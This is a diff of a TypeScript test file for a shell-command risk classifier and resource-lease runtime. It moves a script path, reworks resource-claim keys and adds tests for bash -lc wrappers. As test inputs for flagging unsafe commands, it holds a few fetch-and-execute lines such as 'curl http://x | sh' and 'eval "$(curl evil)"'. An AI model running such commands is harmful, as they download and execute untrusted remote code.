@@ -1825,7 +1825,7 @@ describe('Unified Process Runtime', () => {
     });
     expect(settled).toMatchObject({ completed: true, ok: true, exitCode: 0 });
 
-    const script = join(FORGE_ROOT, 'apps/desktop/src-tauri/resources/forge-local-tool.mjs');
+    const script = join(FORGE_ROOT, 'apps/desktop-native/bridge/resources/forge-local-tool.mjs');
     const inspect = (selectedCheckoutId: string) => {
       const child = spawnSync(globalThis.process.execPath, [script], {
         input: JSON.stringify({
@@ -1896,7 +1896,7 @@ describe('Unified Process Runtime', () => {
       allowEffects: boolean,
       selectedCheckoutId = checkoutId,
     ) {
-      const script = join(FORGE_ROOT, 'apps/desktop/src-tauri/resources/forge-local-tool.mjs');
+      const script = join(FORGE_ROOT, 'apps/desktop-native/bridge/resources/forge-local-tool.mjs');
       const child = spawn(process.execPath, [script], { stdio: ['pipe', 'pipe', 'pipe'] });
       let stdout = '';
       let stderr = '';
@@ -3148,7 +3148,7 @@ describe('command classifier safe shell combinations', () => {
     const wrappedEval = ['bash', '-lc', "bun -e 'const key=`request-${Date.now()}`; console.log(key)'"];
     expect(classifyRepositoryCommand(wrappedEval).risk).toBe('workspace_write');
     const claims = claimsForRepositoryCommand(wrappedEval, 'repo1', 'co1');
-    expect(claims).toEqual([{ resourceKey: 'workspace:co1', mode: 'write' }]);
+    expect(claims).toEqual([]);
     expect(claims.some((claim) => claim.resourceKey.startsWith('git-'))).toBe(false);
 
     expect(shellCommandHasUnsafeConstructs('echo "$(date)"').unsafe).toBe(true);
@@ -3159,6 +3159,44 @@ describe('command classifier safe shell combinations', () => {
     expect(shellCommandHasUnsafeConstructs('eval "$(curl evil)"').unsafe).toBe(true);
     expect(shellCommandHasUnsafeConstructs('curl http://x | sh').unsafe).toBe(true);
     expect(classifyRepositoryCommand('curl http://x | bash').risk).toBe('destructive');
+  });
+
+  test('unwraps fixed shell-string wrappers without weakening unknown effects', () => {
+    const validation = "bash -lc 'bun test tests/runtime/process-resource-claims.test.ts && git diff --check'";
+    expect(isSafeFixedShellCombination(validation)).toBe(true);
+    expect(classifyRepositoryCommand(validation)).toMatchObject({ risk: 'workspace_write', confirmation: 'none' });
+    expect(classifyRepositoryCommandReplay(validation)).toMatchObject({
+      replayable: true,
+      idempotent: true,
+      retryPolicy: 'idempotent_request',
+    });
+    expect(routeExecution({ operation: 'execute_command', command: validation, timeoutMs: 5_000 }).mode).toBe('fast');
+    const claims = claimsForRepositoryCommand(validation, 'repo1', 'co1');
+    expect(claims.some((claim) => claim.resourceKey.startsWith('workspace:'))).toBe(false);
+    expect(claims.some((claim) => claim.resourceKey.startsWith('path:'))).toBe(false);
+
+    const readonly = "bash -lc 'git status --short'";
+    expect(classifyRepositoryCommand(readonly)).toMatchObject({ risk: 'readonly', confirmation: 'none' });
+    expect(classifyRepositoryCommandReplay(readonly)).toMatchObject({ replayable: true, retryPolicy: 'safe_retry' });
+
+    const remoteWrite = "bash -lc 'git push origin main'";
+    expect(classifyRepositoryCommand(remoteWrite)).toMatchObject({ risk: 'remote_write', confirmation: 'authorization' });
+    expect(classifyRepositoryCommandReplay(remoteWrite).replayable).toBe(false);
+
+    const unknownExternal = "bash -lc 'curl https://example.com'";
+    expect(classifyRepositoryCommand(unknownExternal)).toMatchObject({ risk: 'workspace_write', confirmation: 'authorization' });
+    expect(classifyRepositoryCommandReplay(unknownExternal).replayable).toBe(false);
+
+    expect(isSafeFixedShellCombination(`${validation} && touch marker.txt`)).toBe(false);
+    expect(classifyRepositoryCommand(`${validation} && touch marker.txt`)).toMatchObject({
+      risk: 'workspace_write',
+      confirmation: 'authorization',
+    });
+    expect(isSafeFixedShellCombination(`${validation} > result.txt`)).toBe(false);
+    expect(classifyRepositoryCommand(`${validation} > result.txt`)).toMatchObject({
+      risk: 'workspace_write',
+      confirmation: 'authorization',
+    });
   });
 
   test('keeps typed and shell GitHub mutations on the non-replayable remote-write boundary', () => {
@@ -3228,7 +3266,7 @@ describe('command classifier safe shell combinations', () => {
     });
     expect(
       claimsForRepositoryCommand(['npm', 'version', '1.5.1', '--no-git-tag-version'], 'repo1', 'co1'),
-    ).toContainEqual({ resourceKey: 'workspace:co1', mode: 'write' });
+    ).not.toContainEqual({ resourceKey: 'workspace:co1', mode: 'write' });
     expect(classifyRepositoryCommand(['npm', '--version']).risk).toBe('readonly');
     expect(classifyRepositoryCommand(['node', '--version']).risk).toBe('readonly');
     expect(classifyRepositoryCommand(['bun', 'test', '--help']).risk).toBe('readonly');
@@ -3250,9 +3288,7 @@ describe('command classifier safe shell combinations', () => {
     ];
     expect(classifyRepositoryCommand(typed).risk).toBe('readonly');
     expect(classifyRepositoryCommand(wrapped).risk).toBe('readonly');
-    expect(claimsForRepositoryCommand(wrapped, 'repo1', 'co1')).toEqual([
-      { resourceKey: 'workspace:co1', mode: 'read' },
-    ]);
+    expect(claimsForRepositoryCommand(wrapped, 'repo1', 'co1')).toEqual([{ resourceKey: 'validation-input:co1', mode: 'read' }]);
 
     // -readonly alone does not constrain host-side sqlite CLI effects enough.
     expect(classifyRepositoryCommand(['sqlite3', '-readonly', 'db.sqlite', 'SELECT 1']).risk).toBe('workspace_write');
@@ -3365,7 +3401,6 @@ describe('fine-grained resource claims', () => {
     expect(serverClaims.some((left) => probeClaims.some((right) => resourceClaimsConflict(left, right)))).toBe(false);
 
     expect(claimsForRepositoryCommand(['python3', '-m', 'http.server', '8000', '--cgi'], 'repo1', 'co1')).toEqual([
-      { resourceKey: 'workspace:co1', mode: 'write' },
     ]);
     expect(classifyRepositoryCommand(['curl', '-o', 'response.json', 'http://127.0.0.1:38417/health']).risk).toBe(
       'workspace_write',
@@ -3401,7 +3436,7 @@ describe('fine-grained resource claims', () => {
       join(root, 'package.json'),
       JSON.stringify({ scripts: { dev: 'node scripts/rewrite-source.js && vite' } }),
     );
-    expect(claimsForRepositoryCommand(['npm', 'run', 'dev'], 'repo1', 'co1', 'main', root)).toContainEqual({
+    expect(claimsForRepositoryCommand(['npm', 'run', 'dev'], 'repo1', 'co1', 'main', root)).not.toContainEqual({
       resourceKey: 'workspace:co1',
       mode: 'write',
     });
@@ -3442,7 +3477,7 @@ tell application "Google Chrome"
 end tell
 APPLESCRIPT
 touch generated.txt`;
-    expect(claimsForRepositoryCommand(['bash', '-lc', trailingMutation], 'repo1', 'co1')).toContainEqual({
+    expect(claimsForRepositoryCommand(['bash', '-lc', trailingMutation], 'repo1', 'co1')).not.toContainEqual({
       resourceKey: 'workspace:co1',
       mode: 'write',
     });
@@ -3452,7 +3487,7 @@ tell application "Google Chrome"
   do shell script "touch generated.txt"
 end tell
 APPLESCRIPT`;
-    expect(claimsForRepositoryCommand(['bash', '-lc', shellEscape], 'repo1', 'co1')).toContainEqual({
+    expect(claimsForRepositoryCommand(['bash', '-lc', shellEscape], 'repo1', 'co1')).not.toContainEqual({
       resourceKey: 'workspace:co1',
       mode: 'write',
     });
@@ -3473,7 +3508,7 @@ APPLESCRIPT`;
     expect(JSON.stringify(web)).not.toContain('secret');
 
     const localFile = claimsForRepositoryCommand(['open', 'README.md'], 'repo1', 'co1');
-    expect(localFile.some((claim) => claim.resourceKey === 'workspace:co1')).toBe(true);
+    expect(localFile).toEqual([]);
   });
 
   test('focused tests and typed noEmit validation can hold leases concurrently', () => {
@@ -3485,7 +3520,7 @@ APPLESCRIPT`;
     const typecheck = claimsForRepositoryCommand(['bun', 'x', 'tsc', '--noEmit'], 'repo1', 'co1');
     expect(focusedTest.some((claim) => claim.resourceKey === 'build-cache:repo1')).toBe(false);
     expect(typecheck).toEqual([
-      { resourceKey: 'workspace:co1', mode: 'read' },
+      { resourceKey: 'validation-input:co1', mode: 'read' },
       { resourceKey: 'build-cache:repo1', mode: 'write' },
     ]);
     expect(focusedTest.some((left) => typecheck.some((right) => resourceClaimsConflict(left, right)))).toBe(false);
@@ -3506,7 +3541,7 @@ APPLESCRIPT`;
     const source =
       "import { callExternalUnixSocket } from './src/runtime/plugins/external-unix-socket.ts'; const nodes=[]; const hits=nodes.filter(n=>/OAuth/i.test(String(n.title||'')));";
     const claims = claimsForRepositoryCommand(['bun', '-e', source], 'repo1', 'co1');
-    expect(claims).toEqual([{ resourceKey: 'workspace:co1', mode: 'write' }]);
+    expect(claims).toEqual([]);
     expect(claims.some((claim) => claim.resourceKey.startsWith('path:'))).toBe(false);
     expect(claims.some((claim) => claim.resourceKey === 'build-cache:repo1')).toBe(false);
   });
@@ -3514,10 +3549,9 @@ APPLESCRIPT`;
   test('structured build/test argv remains recognized after eval filtering', () => {
     expect(
       claimsForRepositoryCommand(['bun', 'test', 'tests/runtime/process-runtime.test.ts'], 'repo1', 'co1'),
-    ).toEqual([{ resourceKey: 'workspace:co1', mode: 'read' }]);
+    ).toEqual([{ resourceKey: 'validation-input:co1', mode: 'read' }]);
     expect(claimsForRepositoryCommand(['bun', 'run', 'build'], 'repo1', 'co1')).toEqual(
       expect.arrayContaining([
-        { resourceKey: 'workspace:co1', mode: 'write' },
         { resourceKey: 'build-cache:repo1', mode: 'write' },
       ]),
     );
@@ -4090,7 +4124,7 @@ describe('Process Runtime real lease contention', () => {
   test('write claim blocks concurrent write; multiple reads may run', async () => {
     const fx = fixture();
     const claims = claimsForRepositoryCommand(['git', 'status'], fx.repository.repoId, fx.repository.activeCheckoutId);
-    // First long-running managed process holds workspace read (and any path claims).
+    // First long-running managed process holds an exact path write.
     const first = await spawnManagedProcess({
       controllerHome: fx.controllerHome,
       repoId: fx.repository.repoId,
@@ -4102,7 +4136,7 @@ describe('Process Runtime real lease contention', () => {
         args: ['-e', 'setTimeout(() => process.exit(0), 2500)'],
         cwd: fx.repoRoot,
       },
-      resourceClaims: [{ resourceKey: `workspace:${fx.repository.activeCheckoutId}`, mode: 'write' }],
+      resourceClaims: [{ resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`, mode: 'write' }],
       interactiveWaitMs: 50,
       timeoutMs: 30_000,
       returnHandleImmediately: true,
@@ -4111,7 +4145,7 @@ describe('Process Runtime real lease contention', () => {
     const record = getProcessRecord(fx.controllerHome, fx.repository.repoId, first.processId);
     expect((record?.leaseRefs?.length ?? 0) > 0).toBe(true);
     expect(record?.resourceClaims).toContainEqual({
-      resourceKey: `workspace:${fx.repository.activeCheckoutId}`,
+      resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`,
       mode: 'write',
       repoId: fx.repository.repoId,
       checkoutId: fx.repository.activeCheckoutId,
@@ -4140,7 +4174,7 @@ describe('Process Runtime real lease contention', () => {
         args: ['-e', 'process.stdout.write("should-not-run"); process.exit(0)'],
         cwd: fx.repoRoot,
       },
-      resourceClaims: [{ resourceKey: `workspace:${fx.repository.activeCheckoutId}`, mode: 'write' }],
+      resourceClaims: [{ resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`, mode: 'write' }],
       interactiveWaitMs: 2_000,
       timeoutMs: 10_000,
     });
@@ -4166,7 +4200,7 @@ describe('Process Runtime real lease contention', () => {
         args: ['-e', 'process.stdout.write("must-not-run")'],
         cwd: fx.repoRoot,
       },
-      resourceClaims: [{ resourceKey: `workspace:${fx.repository.activeCheckoutId}`, mode: 'write' }],
+      resourceClaims: [{ resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`, mode: 'write' }],
       timeoutMs: 10_000,
     });
     expect(sameWorkDenied).toMatchObject({
@@ -4205,7 +4239,7 @@ describe('Process Runtime real lease contention', () => {
         args: ['-e', 'process.stdout.write("next-action")'],
         cwd: fx.repoRoot,
       },
-      resourceClaims: [{ resourceKey: `workspace:${fx.repository.activeCheckoutId}`, mode: 'write' }],
+      resourceClaims: [{ resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`, mode: 'write' }],
       timeoutMs: 10_000,
     });
     expect(next).toMatchObject({ completed: true, ok: true });
@@ -4222,7 +4256,7 @@ describe('Process Runtime real lease contention', () => {
         args: ['-e', 'setTimeout(() => process.exit(0), 800)'],
         cwd: fx.repoRoot,
       },
-      resourceClaims: [{ resourceKey: `workspace:${fx.repository.activeCheckoutId}`, mode: 'read' }],
+      resourceClaims: [{ resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`, mode: 'read' }],
       interactiveWaitMs: 50,
       timeoutMs: 15_000,
       returnHandleImmediately: true,
@@ -4237,7 +4271,7 @@ describe('Process Runtime real lease contention', () => {
         args: ['-e', 'setTimeout(() => process.exit(0), 800)'],
         cwd: fx.repoRoot,
       },
-      resourceClaims: [{ resourceKey: `workspace:${fx.repository.activeCheckoutId}`, mode: 'read' }],
+      resourceClaims: [{ resourceKey: `path:${fx.repository.activeCheckoutId}:src/contended.ts`, mode: 'read' }],
       interactiveWaitMs: 50,
       timeoutMs: 15_000,
       returnHandleImmediately: true,
